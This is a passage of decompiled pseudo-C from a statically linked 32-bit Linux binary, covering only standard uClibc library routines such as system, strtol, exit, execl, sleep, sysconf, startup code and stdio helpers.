  }
  return result;
}

//----- (08053774) --------------------------------------------------------
int __cdecl _libc_system(int a1)
{
  int result; // eax@1
  int v2; // eax@2
  pid_t v3; // ebx@2
  int v4; // [esp+1Ch] [ebp-20h]@2
  int v5; // [esp+20h] [ebp-1Ch]@2
  int v6; // [esp+24h] [ebp-18h]@2
  int status; // [esp+34h] [ebp-8h]@7

  result = 1;
  if ( a1 )
  {
    v4 = signal(3, 1);
    v5 = signal(2, 1);
    v6 = signal(17, 0);
    v2 = _vfork();
    v3 = v2;
    if ( v2 >= 0 )
    {
      if ( !v2 )
      {
        signal(3, 0);
        signal(2, 0);
        signal(17, 0);
        execl("/bin/sh", (int)"sh", (unsigned int)&unk_805B308);
        exit(127);
      }
      signal(3, 1);
      signal(2, 1);
      if ( wait4(v3, &status, 0, 0) == -1 )
        status = -1;
      signal(3, v4);
      signal(2, v5);
      signal(17, v6);
      result = status;
    }
    else
    {
      signal(3, v4);
      signal(2, v5);
      signal(17, v6);
      result = -1;
    }
  }
  return result;
}
// 80542B8: using guessed type int _vfork(void);

//----- (080538A8) --------------------------------------------------------
unsigned int __cdecl atol(_BYTE *a1)
{
  return strtol(a1, 0, 10);
}

//----- (080538BC) --------------------------------------------------------
unsigned int __cdecl strtol(_BYTE *a1, _DWORD *a2, int a3)
{
  return stdlib_strto_l(a1, a2, a3, 1);
}

//----- (080538D8) --------------------------------------------------------
unsigned int __cdecl stdlib_strto_l(_BYTE *a1, _DWORD *a2, int a3, int a4)
{
  int v4; // esi@1
  _BYTE *i; // ebx@1
  int v6; // eax@3
  char v7; // bp@5
  _BYTE *v8; // edi@9
  unsigned int v9; // edx@15
  unsigned __int8 v10; // cl@18
  unsigned __int8 v11; // al@19
  _DWORD *v12; // eax@25
  _DWORD *v13; // eax@31
  unsigned int v15; // [esp+4h] [ebp-18h]@16

  v4 = a3;
  for ( i = a1; ; ++i )
  {
    v6 = (char)*i;
    if ( !(*((_BYTE *)_ctype_b + 2 * v6) & 0x20) )
      break;
  }
  if ( v6 == 43 )
  {
    v7 = 0;
  }
  else
  {
    v7 = 0;
    if ( v6 != 45 )
      goto LABEL_9;
    v7 = 1;
  }
  ++i;
LABEL_9:
  v8 = a1;
  if ( !(a3 & 0xFFFFFFEF) )
  {
    v4 = a3 + 10;
    if ( *i == 48 )
    {
      ++i;
      v4 = a3 + 8;
      v8 = i;
      if ( (*i | 0x20) == 120 )
      {
        v4 *= 2;
        ++i;
      }
    }
    if ( v4 > 16 )
      v4 = 16;
  }
  v9 = 0;
  if ( (unsigned int)(v4 - 2) <= 0x22 )
  {
    v9 = 0;
    v15 = 0xFFFFFFFF / v4;
    while ( 1 )
    {
      v10 = *i - 48;
      if ( v10 > 9u )
      {
        v11 = *i | 0x20;
        v10 = 40;
        if ( v11 > 0x60u )
          v10 = v11 - 87;
      }
      if ( v10 >= v4 )
        break;
      ++i;
      if ( v9 <= v15 && (v9 != v15 || v10 <= (unsigned __int8)(0xFFFFFFFF % v4)) )
      {
        v9 = v10 + v4 * v9;
      }
      else
      {
        v7 &= a4;
        v12 = _errno_location();
        v9 = -1;
        *v12 = 34;
      }
      v8 = i;
    }
  }
  if ( a2 )
    *a2 = v8;
  if ( a4 && v9 > 2147483648 - ((unsigned __int8)v7 < 1u) )
  {
    v13 = _errno_location();
    v9 = 2147483648 - ((unsigned __int8)v7 < 1u);
    *v13 = 34;
  }
  if ( v7 )
    v9 = -v9;
  return v9;
}
// 8061BE0: using guessed type void *_ctype_b;

//----- (080539F0) --------------------------------------------------------
void __usercall __noreturn exit(off_t a1@<ebp>, int status)
{
  char v2; // [esp+14h] [ebp-18h]@1

  pthread_cleanup_push_defer(&v2, (int)pthread_mutex_unlock, (int)&_atexit_lock);
  pthread_mutex_lock((int)&_atexit_lock);
  if ( _exit_cleanup )
    _exit_cleanup(status);
  pthread_cleanup_pop_restore(a1, (int)&v2, 1);
  _uClibc_fini();
  if ( stdio_term )
    stdio_term();
  exit(status);
}
// 806A464: using guessed type int (__cdecl *_exit_cleanup)(_DWORD);

//----- (08053A58) --------------------------------------------------------
signed int __usercall on_exit@<eax>(unsigned __int32 a1@<ebp>, int a2@<edi>, int a3, int a4)
{
  _DWORD *v4; // edx@1
  signed int result; // eax@1

  v4 = _new_exitfn(a1, a2);
  result = -1;
  if ( v4 )
  {
    v4[1] = a3;
    *v4 = 2;
    v4[2] = a4;
    result = 0;
  }
  return result;
}

//----- (08053A84) --------------------------------------------------------
unsigned int __cdecl execl(char *file, int a2, char a3)
{
  int v3; // esi@1
  char *v4; // edx@2
  void *v5; // esp@3
  _DWORD *v6; // ecx@3
  char *v7; // eax@4
  char *v9; // [esp+Ch] [ebp-Ch]@1

  v3 = 0;
  v9 = &a3;
  do
  {
    v4 = v9;
    ++v3;
    v9 += 4;
  }
  while ( *(_DWORD *)v4 );
  v5 = alloca(4 * v3 + 19);
  v6 = (_DWORD *)(((unsigned int)&v9 + 3) & 0xFFFFFFF0);
  *(_DWORD *)(((unsigned int)&v9 + 3) & 0xFFFFFFF0) = a2;
  v9 = &a3;
  do
  {
    v7 = v9;
    ++v6;
    --v3;
    v9 += 4;
    *v6 = *(_DWORD *)v7;
  }
  while ( v3 );
  return execve(file, (const char **)(((unsigned int)&v9 + 3) & 0xFFFFFFF0), (const char **)environ);
}

//----- (08053AF0) --------------------------------------------------------
__time_t __usercall sleep@<eax>(off_t a1@<ebp>, __time_t a2)
{
  signed int v2; // eax@1
  _BOOL4 v3; // eax@7
  signed int v4; // edx@7
  _DWORD *v5; // eax@13
  _DWORD *v6; // ebx@13
  int v7; // esi@13
  __time_t result; // eax@13
  unsigned int v9; // edi@15
  int *v10; // ebx@15
  int v11; // esi@15
  unsigned int v12; // eax@8
  int v13; // [esp+18h] [ebp-1A4h]@12
  char v14; // [esp+A4h] [ebp-118h]@7
  int v15[32]; // [esp+124h] [ebp-98h]@3
  struct timespec rem; // [esp+1A4h] [ebp-18h]@5

  v2 = 32;
  if ( !a2 )
    return 0;
  while ( --v2 >= 0 )
    v15[v2] = 0;
  rem.tv_nsec = 0;
  rem.tv_sec = a2;
  if ( _sigaddset((int)v15, 17) >= 0 && !sigprocmask(0, (int)v15) )
  {
    v3 = _sigismember((int)&v14, 17);
    v4 = 32;
    if ( v3 )
    {
      v12 = nanosleep(a1, (int)&rem, &rem);
      goto LABEL_17;
    }
    while ( --v4 >= 0 )
      v15[v4] = 0;
    if ( _sigaddset((int)v15, 17) >= 0 )
    {
      if ( sigaction(17, 0, &v13) < 0 )
      {
        v5 = _errno_location();
        v6 = v5;
        v7 = *v5;
        sigprocmask(2u, (int)&v14);
        result = -1;
        *v6 = v7;
        return result;
      }
      if ( v13 == 1 )
      {
        v9 = nanosleep((off_t)&v14, (int)&rem, &rem);
        v10 = (int *)_errno_location();
        v11 = *v10;
        sigprocmask(2u, (int)&v14);
        *v10 = v11;
        goto LABEL_18;
      }
      sigprocmask(2u, (int)&v14);
      v12 = nanosleep((off_t)&v14, (int)&rem, &rem);
LABEL_17:
      v9 = v12;
LABEL_18:
      if ( v9 )
        return rem.tv_sec + (rem.tv_nsec > 499999999);
      return 0;
    }
  }
  return -1;
}
// 8053AF0: using guessed type int var_98[32];

//----- (08053C7C) --------------------------------------------------------
signed int __cdecl sysconf(int a1)
{
  signed int result; // eax@2

  switch ( a1 )
  {
    case 0:
      return 0x20000;
    case 1:
    case 23:
    case 24:
    case 27:
    case 32:
    case 33:
    case 34:
    case 41:
    case 49:
    case 50:
    case 53:
    case 54:
    case 55:
    case 56:
    case 57:
    case 58:
    case 59:
    case 60:
    case 61:
    case 62:
    case 63:
    case 64:
    case 65:
    case 66:
    case 85:
    case 86:
    case 96:
    case 97:
    case 116:
    case 117:
    case 127:
    case 128:
    case 131:
      goto LABEL_30;
    case 2:
      return 100;
    case 3:
      return 0x10000;
    case 4:
      return getdtablesize();
    case 5:
    case 108:
      return 16;
    case 6:
      return 6;
    case 7:
    case 8:
    case 9:
    case 10:
    case 11:
    case 12:
    case 13:
    case 14:
    case 15:
    case 16:
    case 17:
    case 18:
    case 19:
    case 20:
    case 21:
    case 22:
    case 67:
    case 68:
    case 77:
    case 78:
    case 79:
    case 80:
    case 81:
    case 82:
    case 83:
    case 84:
    case 91:
    case 92:
    case 93:
    case 94:
    case 98:
    case 99:
    case 100:
    case 125:
    case 126:
    case 129:
    case 130:
      return 1;
    case 25:
    case 109:
      return 20;
    case 26:
    case 87:
    case 104:
    case 121:
    case 122:
    case 123:
    case 124:
      return 0x7FFFFFFF;
    case 28:
      return 0x8000;
    case 29:
    case 46:
    case 47:
    case 48:
    case 51:
    case 52:
    case 95:
      goto LABEL_24;
    case 30:
      return getpagesize();
    case 31:
    case 42:
    case 72:
    case 106:
    case 107:
      return 32;
    case 35:
    case 69:
    case 70:
    case 71:
      return 256;
    case 36:
    case 38:
      return 99;
    case 37:
    case 43:
    case 45:
    case 120:
      return 2048;
    case 39:
      return 1000;
    case 40:
    case 115:
      return 255;
    case 44:
    case 110:
    case 113:
      return 0x7FFF;
    case 73:
    case 90:
      return 4;
    case 74:
    case 76:
      return 1024;
    case 75:
      return 0x4000;
    case 88:
      return 4096;
    case 89:
      return 500;
    case 101:
      return 8;
    case 102:
    case 111:
      return 127;
    case 103:
    case 112:
      return -128;
    case 105:
      return 2147483648;
    case 114:
      return -32768;
    case 118:
      return 0xFFFF;
    case 119:
      return 9;
    case 149:
      if ( clock_getres() < 0 )
        goto LABEL_30;
LABEL_24:
      result = 200112;
      break;
    default:
      *(_DWORD *)_errno_location() = 22;
LABEL_30:
      result = -1;
      break;
  }
  return result;
}

//----- (08053DC4) --------------------------------------------------------
void *_libc_pthread_init()
{
  return &_libc_multiple_threads;
}

//----- (08053DCC) --------------------------------------------------------
int _uClibc_fini()
{
  int i; // ebx@1
  int result; // eax@7
  int v2; // [esp+0h] [ebp-Ch]@0

  for ( i = 0; --i != -1; ((void (*)(void))_CTOR_LIST__[i])() )
    ;
  if ( _app_fini )
    _app_fini();
  if ( _rtld_fini )
    result = _rtld_fini();
  else
    result = v2;
  return result;
}
// 805D368: using guessed type int _CTOR_LIST__[];
// 806A478: using guessed type int (*_app_fini)(void);
// 806A47C: using guessed type int (*_rtld_fini)(void);

//----- (08053E0B) --------------------------------------------------------
int _pthread_return_0()
{
  return 0;
}

//----- (08053E0F) --------------------------------------------------------
int __usercall _check_one_fd@<eax>(int a1@<eax>, int a2@<edx>)
{
  int v2; // esi@1
  int v3; // ebx@1
  struct flock *v5; // [esp+0h] [ebp-14h]@0
  int v6; // [esp+8h] [ebp-Ch]@0

  v2 = a1;
  v3 = a2;
  if ( _libc_fcntl(a1, 1, v5) == -1 && _libc_open("/dev/null", v3, 0) != v2 )
    abort();
  return v6;
}

//----- (08053E43) --------------------------------------------------------
_BOOL4 (*_uClibc_init())()
{
  _BOOL4 (*result)(); // eax@4

  if ( !been_there_done_that_2832 )
  {
    been_there_done_that_2832 = 1;
    _pagesize = 4096;
    if ( _pthread_initialize_minimal )
      _pthread_initialize_minimal();
    result = stdio_init;
    if ( stdio_init )
      result = (_BOOL4 (*)())stdio_init();
  }
  return result;
}
// 806A474: using guessed type int _pagesize;
// 806A480: using guessed type char been_there_done_that_2832;

//----- (08053E83) --------------------------------------------------------
void __cdecl __noreturn _uClibc_main(int (__cdecl *a1)(int, char ***, char **, _DWORD *), int a2, char ***a3, void (*a4)(void), int (*a5)(void), int (*a6)(void), int a7)
{
  char **v7; // eax@3
  bool v8; // zf@4
  char *i; // ebx@5
  int v10; // eax@10
  signed int v11; // ebx@13
  signed int v12; // ebx@14
  _DWORD *v13; // eax@23
  int status; // eax@25
  char v15[52]; // [esp+24h] [ebp-88h]@3
  int v16; // [esp+58h] [ebp-54h]@10
  int v17; // [esp+80h] [ebp-2Ch]@12
  int v18; // [esp+88h] [ebp-24h]@16
  int v19; // [esp+90h] [ebp-1Ch]@17
  int v20; // [esp+98h] [ebp-14h]@17

  _libc_stack_end = a7;
  _rtld_fini = a6;
  environ = (char **)&a3[a2 + 1];
  if ( environ == *a3 )
    environ = (char **)&a3[a2];
  memset(v15, 0, 0x78u);
  v7 = environ;
  do
  {
    v8 = *v7 == 0;
    ++v7;
  }
  while ( !v8 );
  for ( i = (char *)v7; *(_DWORD *)i; i += 8 )
  {
    if ( *(_DWORD *)i <= 0xEu )
      memcpy(&v15[8 * *(_DWORD *)i], i, 8u);
  }
  dl_aux_init((int)v15);
  _uClibc_init();
  v10 = v16;
  if ( !v16 )
    LOWORD(v10) = 4096;
  _pagesize = v10;
  if ( v17 == -1 && ((v11 = getuid(), v11 != geteuid()) || (v12 = getgid(), v12 != getegid()))
    || v17 != -1 && (v17 != v18 || v19 != v20) )
  {
    _check_one_fd(0, 0x20000);
    _check_one_fd(1, 131074);
    _check_one_fd(2, 131074);
  }
  _uclibc_progname = *a3;
  _app_fini = a5;
  if ( a4 )
    a4();
  if ( _errno_location )
    *(_DWORD *)_errno_location() = 0;
  v13 = _h_errno_location;
  if ( _h_errno_location )
  {
    v13 = _h_errno_location();
    *v13 = 0;
  }
  status = a1(a2, a3, environ, v13);
  exit((off_t)a4, status);
}
// 8061BD8: using guessed type void *_uclibc_progname;
// 806A46C: using guessed type int _libc_stack_end;
// 806A474: using guessed type int _pagesize;
// 806A478: using guessed type int (*_app_fini)(void);
// 806A47C: using guessed type int (*_rtld_fini)(void);
// 8053E83: using guessed type char var_88[52];

//----- (0805403C) --------------------------------------------------------
int (__cdecl *rpc_thread_multi())(int a1, void *a2)
{
  int (__cdecl *result)(int, void *); // eax@1

  result = _pthread_internal_tsd_set;
  if ( _pthread_internal_tsd_set )
    return (int (__cdecl *)(int, void *))_pthread_internal_tsd_set(2, &_libc_tsd_RPC_VARS_mem);
  _libc_tsd_RPC_VARS_data = (int)&_libc_tsd_RPC_VARS_mem;
  return result;
}
// 806A998: using guessed type int _libc_tsd_RPC_VARS_data;

//----- (08054069) --------------------------------------------------------
_DWORD *__usercall _rpc_thread_variables@<eax>(off_t a1@<ebp>, int a2@<edi>)
{
  _DWORD *v2; // eax@2
  _DWORD *v3; // ebx@4
  _DWORD *v4; // eax@10
  _DWORD *v5; // eax@18

  if ( _pthread_internal_tsd_get )
    v2 = _pthread_internal_tsd_get(2);
  else
    v2 = (_DWORD *)_libc_tsd_RPC_VARS_data;
  v3 = v2;
  if ( !v2 )
  {
    if ( pthread_once )
    {
      pthread_once(&once_5746, (void (__fastcall *)(int, _DWORD))rpc_thread_multi);
    }
    else if ( !once_5746 )
    {
      rpc_thread_multi();
      once_5746 = 1;
    }
    if ( _pthread_internal_tsd_get )
      v4 = _pthread_internal_tsd_get(2);
    else
      v4 = (_DWORD *)_libc_tsd_RPC_VARS_data;
    v3 = v4;
    if ( !v4 )
    {
      v3 = calloc(a1, a2, 1u, 200);
      if ( v3 )
      {
        if ( _pthread_internal_tsd_set )
          _pthread_internal_tsd_set(2, v3);
        else
          _libc_tsd_RPC_VARS_data = (int)v3;
      }
      else
      {
        if ( _pthread_internal_tsd_get )
          v5 = _pthread_internal_tsd_get(2);
        else
          v5 = (_DWORD *)_libc_tsd_RPC_VARS_data;
        v3 = v5;
      }
    }
  }
  return v3;
}
// 806A484: using guessed type int once_5746;
// 806A998: using guessed type int _libc_tsd_RPC_VARS_data;

//----- (0805414A) --------------------------------------------------------
void *__usercall _rpc_thread_svc_max_pollfd@<eax>(off_t a1@<ebp>, int a2@<edi>)
{
  _DWORD *v2; // eax@1
  void *v3; // edx@1

  v2 = _rpc_thread_variables(a1, a2);
  v3 = &svc_max_pollfd;
  if ( v2 != (_DWORD *)&_libc_tsd_RPC_VARS_mem )
    v3 = v2 + 37;
  return v3;
}

//----- (0805416A) --------------------------------------------------------
void *__usercall _rpc_thread_svc_pollfd@<eax>(off_t a1@<ebp>, int a2@<edi>)
{
  _DWORD *v2; // eax@1
  void *v3; // edx@1

  v2 = _rpc_thread_variables(a1, a2);
  v3 = &svc_pollfd;
  if ( v2 != (_DWORD *)&_libc_tsd_RPC_VARS_mem )
    v3 = v2 + 36;
  return v3;
}

//----- (0805418A) --------------------------------------------------------
void *__usercall _rpc_thread_createerr@<eax>(off_t a1@<ebp>, int a2@<edi>)
{
  _DWORD *v2; // eax@1
  void *v3; // edx@1

  v2 = _rpc_thread_variables(a1, a2);
  v3 = &rpc_createerr;
  if ( v2 != (_DWORD *)&_libc_tsd_RPC_VARS_mem )
    v3 = v2 + 32;
  return v3;
}

//----- (080541AA) --------------------------------------------------------
void *__usercall _rpc_thread_svc_fdset@<eax>(off_t a1@<ebp>, int a2@<edi>)
{
  _DWORD *v2; // eax@1
  void *v3; // edx@1

  v2 = _rpc_thread_variables(a1, a2);
  v3 = &svc_fdset;
  if ( v2 != (_DWORD *)&_libc_tsd_RPC_VARS_mem )
    v3 = v2;
  return v3;
}

//----- (080541C6) --------------------------------------------------------
__int64 __usercall _rpc_thread_destroy@<edx:eax>(off_t a1@<ebp>, int a2@<edi>)
{
  _DWORD **v2; // ebx@2
  __int64 v4; // [esp+10h] [ebp-Ch]@0

  if ( _pthread_internal_tsd_get )
    v2 = (_DWORD **)_pthread_internal_tsd_get(2);
  else
    v2 = (_DWORD **)_libc_tsd_RPC_VARS_data;
  if ( v2 && v2 != (_DWORD **)&_libc_tsd_RPC_VARS_mem )
  {
    _rpc_thread_svc_cleanup(a1, a2);
    _rpc_thread_clnt_cleanup(a1, a2);
    free(a1, v2[38]);
    free(a1, v2[39]);
    free(a1, v2[40]);
    free(a1, v2[47]);
    free(a1, v2[43]);
    free(a1, v2[44]);
    free(a1, v2);
    if ( _pthread_internal_tsd_set )
      _pthread_internal_tsd_set(2, 0);
    else
      _libc_tsd_RPC_VARS_data = (int)_pthread_internal_tsd_set;
  }
  return v4;
}
// 806A998: using guessed type int _libc_tsd_RPC_VARS_data;

//----- (08054284) --------------------------------------------------------
signed int _syscall_error()
{
  _DWORD *v0; // eax@1
  int v1; // edx@1

  v0 = _errno_location();
  *v0 = v1;
  return -1;
}

//----- (0805429C) --------------------------------------------------------
void __noreturn _longjmp(struct __jmp_buf_tag *__attribute__((__org_arrdim(0,1))) env, int val)
{
  int v2; // ebx@1
  int v3; // esi@1
  int v4; // edi@1
  int v5; // ebp@1
  int v6; // et1@1

  v2 = env->__jmpbuf[0];
  v3 = env->__jmpbuf[1];
  v4 = env->__jmpbuf[2];
  v5 = env->__jmpbuf[3];
  v6 = env->__jmpbuf[4];
  ((void (*)(void))env->__jmpbuf[5])();
}

//----- (080542B8) --------------------------------------------------------
#error "80542B9: positive sp value has been found (funcsize=1)"

//----- (080542D0) --------------------------------------------------------
signed int _socketcall()
{
  __asm { int     80h             ; LINUX -  }
  return 102;
}

//----- (08054304) --------------------------------------------------------
signed int clock_getres()
{
  __asm { int     80h             ; LINUX - sys_clock_getres }
  return 266;
}

//----- (08054338) --------------------------------------------------------
unsigned int __cdecl execve(const char *file, const char **argv, const char **envp)
{
  unsigned int v3; // edi@1

  v3 = sys_execve(file, argv, envp);
  if ( v3 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v3;
    v3 = -1;
  }
  return v3;
}

//----- (08054370) --------------------------------------------------------
signed int getdtablesize()
{
  signed int v0; // eax@1
  signed int v1; // edx@1
  int v3; // [esp+1Ch] [ebp-8h]@2

  v0 = getrlimit();
  v1 = 256;
  if ( v0 >= 0 )
    v1 = v3;
  return v1;
}

//----- (08054398) --------------------------------------------------------
signed int getegid()
{
  __asm { int     80h             ; LINUX - sys_getegid32 }
  return 202;
}

//----- (080543C0) --------------------------------------------------------
signed int getgid()
{
  __asm { int     80h             ; LINUX - sys_getgid32 }
  return 200;
}

//----- (080543E8) --------------------------------------------------------
signed int getuid()
{
  __asm { int     80h             ; LINUX - sys_getuid32 }
  return 199;
}

//----- (08054410) --------------------------------------------------------
unsigned int __cdecl mremap(void *old_address, size_t old_size, size_t new_size, unsigned __int32 flags)
{
  unsigned int v4; // esi@1

  v4 = sys_mremap(old_address, old_size, new_size, flags);
  if ( v4 > 0xFFFFF000 )
  {
    *(_DWORD *)_errno_location() = -v4;
    v4 = -1;
  }
  return v4;
}

//----- (08054450) --------------------------------------------------------
int __cdecl sbrk(int a1)
{
  int v1; // ebx@4

  if ( !_curbrk && brk(0) < 0 )
    return -1;
  if ( a1 )
  {
    v1 = _curbrk;
    if ( brk((void *)(_curbrk + a1)) >= 0 )
      return v1;
    return -1;
  }
  return _curbrk;
}
// 806A5C8: using guessed type int _curbrk;

//----- (080544A0) --------------------------------------------------------
void *_GI___h_errno_location()
{
  return &h_errno;
}

//----- (080544A8) --------------------------------------------------------
int __cdecl wcrtomb(char *a1, int a2)
{
  char *v2; // edx@1
  int v3; // ecx@1
  int result; // eax@3
  char v5; // [esp+14h] [ebp-18h]@2
  int *v6; // [esp+24h] [ebp-8h]@3
  int v7; // [esp+28h] [ebp-4h]@3

  v2 = a1;
  v3 = a2;
  if ( !a1 )
  {
    v2 = &v5;
    v3 = 0;
  }
  v7 = v3;
  v6 = &v7;
  result = wcsnrtombs(v2, (char *)&v6, 1u, 0x10u);
  if ( !result )
    result = 1;
  return result;
}

//----- (080544EC) --------------------------------------------------------
int __cdecl wcsrtombs(char *a1, char *a2, unsigned int a3)
{
  return wcsnrtombs(a1, a2, 0xFFFFFFFF, a3);
}

//----- (0805450C) --------------------------------------------------------
int __cdecl wcsnrtombs(char *a1, char *a2, unsigned int a3, unsigned int a4)
{
  char *v4; // edx@1
  unsigned int v5; // eax@1
  signed int v6; // edi@2
  int *v8; // esi@6
  unsigned int v9; // ebx@7
  unsigned int i; // ecx@9
  int v11; // eax@10
  char v12; // [esp+Ch] [ebp-20h]@3

  v4 = a1;
  v5 = a4;
  if ( a1 )
  {
    v6 = 1;
    if ( a1 == a2 )
    {
      v6 = 0;
      v4 = &v12;
    }
  }
  else
  {
    v6 = 0;
    v4 = &v12;
    v5 = -1;
  }
  v9 = a3;
  if ( a3 > v5 )
    v9 = v5;
  v8 = *(int **)a2;
  for ( i = v9; i; --i )
  {
    v11 = *v8;
    if ( (unsigned int)*v8 > 0x7F )
    {
      *(_DWORD *)_errno_location() = 84;
      return -1;
    }
    *v4 = v11;
    if ( !(_BYTE)v11 )
    {
      v8 = 0;
      break;
    }
    ++v8;
    v4 += v6;
  }
  if ( v4 != &v12 )
    *(_DWORD *)a2 = v8;
  return v9 - i;
}

//----- (08054594) --------------------------------------------------------
size_t __cdecl _stdio_WRITE(int a1, void *addr, size_t len)
{
  char *v3; // esi@1
  size_t v4; // ebx@1
  size_t v5; // ebp@3
  size_t v6; // eax@4
  signed int v7; // eax@6
  char *v8; // edx@8
  int v9; // eax@8
  unsigned int v10; // eax@8
  char v11; // al@11

  v3 = (char *)addr;
  v4 = len;
  while ( v4 )
  {
    v5 = v4;
    if ( (v4 & 0x80000000) != 0 )
      v6 = 0x7FFFFFFF;
    else
      v6 = v4;
    v7 = _libc_write(*(_DWORD *)(a1 + 4), v3, v6);
    if ( v7 < 0 )
    {
      v8 = *(char **)(a1 + 8);
      v9 = *(_DWORD *)(a1 + 12);
      *(_WORD *)a1 |= 8u;
      v10 = v9 - (_DWORD)v8;
      if ( v10 )
      {
        if ( v10 <= v4 )
          v5 = v10;
        while ( 1 )
        {
          v11 = *v3;
          *v8 = *v3;
          if ( v11 == 10 )
          {
            if ( *(_BYTE *)(a1 + 1) & 1 )
              break;
          }
          ++v8;
          if ( !--v5 )
            break;
          ++v3;
        }
        *(_DWORD *)(a1 + 16) = v8;
        v4 -= (unsigned int)&v8[-*(_DWORD *)(a1 + 8)];
      }
      len -= v4;
      return len;
    }
    v4 -= v7;
    v3 += v7;
  }
  return len;
}

//----- (08054614) --------------------------------------------------------
size_t __cdecl _stdio_fwrite(void *a1, void *addr, size_t len)
{
  char *v3; // edi@1
  char *v4; // edx@2
  int v5; // eax@2
  unsigned int v6; // eax@3
  void *v7; // esi@3
  unsigned int v8; // eax@9
  _BYTE *v9; // esi@10
  _BYTE *v10; // ebp@12
  int v11; // eax@12
  int v12; // eax@13

  v3 = (char *)addr;
  if ( *(_BYTE *)(len + 1) & 2 )
    return _stdio_WRITE(len, a1, (size_t)addr);
  v4 = *(char **)(len + 16);
  v5 = *(_DWORD *)(len + 12);
  if ( *(_DWORD *)(len + 4) == -2 )
  {
    v6 = v5 - (_DWORD)v4;
    v7 = addr;
    if ( (unsigned int)addr > v6 )
      v7 = (void *)v6;
    memcpy(v4, (char *)a1, (unsigned int)v7);
    *(_DWORD *)(len + 16) += v7;
    return (size_t)v3;
  }
  if ( (unsigned int)addr <= v5 - (signed int)v4 )
  {
    memcpy(v4, (char *)a1, (unsigned int)addr);
    *(_DWORD *)(len + 16) += addr;
    if ( *(_BYTE *)(len + 1) & 1 )
    {
      if ( memrchr((int)a1, 0xAu, (unsigned int)addr) )
      {
        v8 = _stdio_wcommit(len);
        if ( v8 )
        {
          v9 = addr;
          if ( (unsigned int)addr > v8 )
            v9 = (_BYTE *)v8;
          v10 = (char *)a1 + (_BYTE *)addr - v9;
          v11 = memchr(v10, 10, (int)v9);
          if ( v11 )
          {
            v12 = (int)&v9[(_DWORD)v10 - v11];
            *(_DWORD *)(len + 16) -= v12;
            v3 = (char *)addr - v12;
          }
        }
      }
    }
    return (size_t)v3;
  }
  if ( v4 == *(char **)(len + 8) || !_stdio_wcommit(len) )
    return _stdio_WRITE(len, a1, (size_t)addr);
  return 0;
}

//----- (08054704) --------------------------------------------------------
signed int __cdecl _stdio_trans2w_o(unsigned int *a1, int a2)
{
  int v2; // edx@1
  __int16 v3; // dx@4
  int v4; // edx@6
  unsigned int v5; // eax@12

  v2 = (unsigned __int16)*a1;
  if ( !(v2 & a2) )
  {
    if ( v2 & 0x880 )
    {
LABEL_5:
      *(_DWORD *)_errno_location() = 9;
LABEL_6:
      *(_WORD *)a1 |= 8u;
      return -1;
    }
    *(_WORD *)a1 = a2 | *a1;
  }
  v3 = *(_WORD *)a1;
  if ( *(_WORD *)a1 & 0x20 )
    goto LABEL_5;
  if ( v3 & 3 )
  {
    if ( !(v3 & 4) && (a1[5] != a1[4] || v3 & 2) && fseeko((int)a1, 0, 2 - ((v3 & 0x400u) < 1)) )
      goto LABEL_6;
    *(_WORD *)a1 &= 0xFFFCu;
    v5 = a1[2];
    a1[6] = v5;
    a1[4] = v5;
    a1[5] = v5;
  }
  *(_WORD *)a1 |= 0x40u;
  v4 = 0;
  if ( !((*(_WORD *)a1 >> 8) & 0xB) )
    a1[7] = a1[3];
  return v4;
}

//----- (080547A4) --------------------------------------------------------
__int64 __cdecl load_inttype(int a1, int a2, int a3)
{
  __int64 result; // rax@3

  if ( a3 >= 0 )
  {
    if ( !(BYTE1(a1) & 8) )
    {
      LODWORD(result) = *(_DWORD *)a2;
      if ( a1 == 256 )
      {
        LODWORD(result) = (unsigned __int8)result;
      }
      else if ( a1 == 512 )
      {
        LODWORD(result) = (unsigned __int16)result;
      }
      HIDWORD(result) = 0;
      return result;
    }
    return *(_QWORD *)a2;
  }
  if ( BYTE1(a1) & 8 )
    return *(_QWORD *)a2;
  LODWORD(result) = *(_DWORD *)a2;
  if ( a1 == 256 )
  {
    LODWORD(result) = (char)result;
  }
  else if ( a1 == 512 )
  {
    LODWORD(result) = (signed __int16)result;
  }
  return (signed int)result;
}

//----- (080547FC) --------------------------------------------------------
__int64 __cdecl store_inttype(_BYTE *a1, int a2, __int64 a3)
{
  __int64 result; // rax@1

  result = a3;
  switch ( a2 )
  {
    case 256:
      *a1 = a3;
      break;
    case 2048:
      *(_QWORD *)a1 = a3;
      break;
    case 512:
      *(_WORD *)a1 = a3;
      break;
    default:
      *(_DWORD *)a1 = a3;
      break;
  }
  return result;
}

//----- (0805483C) --------------------------------------------------------
_BYTE *__cdecl uintmaxtostr(_BYTE *a1, __int64 a2, signed int a3, char a4)
{
  unsigned int v4; // esi@1
  _BYTE *v5; // edi@1
  __int64 v6; // rcx@1
  unsigned int v7; // ebp@7
  int v8; // ST00_4@9
  unsigned int v9; // eax@9
  unsigned int v10; // edx@9
  char v11; // dl@12
  signed int v13; // [esp+4h] [ebp-1Ch]@3
  unsigned int v14; // [esp+8h] [ebp-18h]@5
  unsigned int v15; // [esp+Ch] [ebp-14h]@5

  v4 = a3;
  v5 = a1;
  v6 = a2;
  if ( a3 >= 0 || (v4 = -a3, SHIDWORD(a2) >= 0) )
  {
    v13 = 0;
  }
  else
  {
    v13 = 1;
    v6 = -a2;
  }
  *a1 = 0;
  v14 = 0xFFFFFFFF / v4;
  v15 = 0xFFFFFFFF % v4 + 1;
  if ( v15 == v4 )
  {
    v15 = 0;
    v14 = 0xFFFFFFFF / v4 + 1;
  }
  v7 = v6;
  do
  {
    if ( HIDWORD(v6) )
    {
      v8 = HIDWORD(v6) % v4;
      HIDWORD(v6) /= v4;
      v9 = v7 % v4 + v8 * v15;
      v10 = v9 % v4;
      v7 = v7 / v4 + v14 * v8 + v9 / v4;
    }
    else
    {
      v10 = v7 % v4;
      v7 /= v4;
    }
    --v5;
    if ( v10 > 9 )
      v11 = a4 + v10;
    else
      v11 = v10 + 48;
    *v5 = v11;
  }
  while ( HIDWORD(v6) | v7 );
  if ( v13 )
    *--v5 = 45;
  return v5;
}

//----- (08054910) --------------------------------------------------------
int __cdecl fpmaxtostr(int a1, long double a2, int a3, int a4)
{
  char v4; // cl@1
  int v5; // ebp@1
  int v6; // eax@5
  long double v7; // fst7@10
  bool v8; // c0@10
  bool v9; // c3@10
  long double v10; // fst7@10
  long double v11; // fst7@12
  long double v12; // fst6@14
  int *v13; // ecx@17
  long double v14; // fst5@18
  signed int v15; // edx@18
  signed int v16; // ecx@18
  long double v17; // fst4@18
  long double v18; // fst3@20
  long double v19; // tt@21
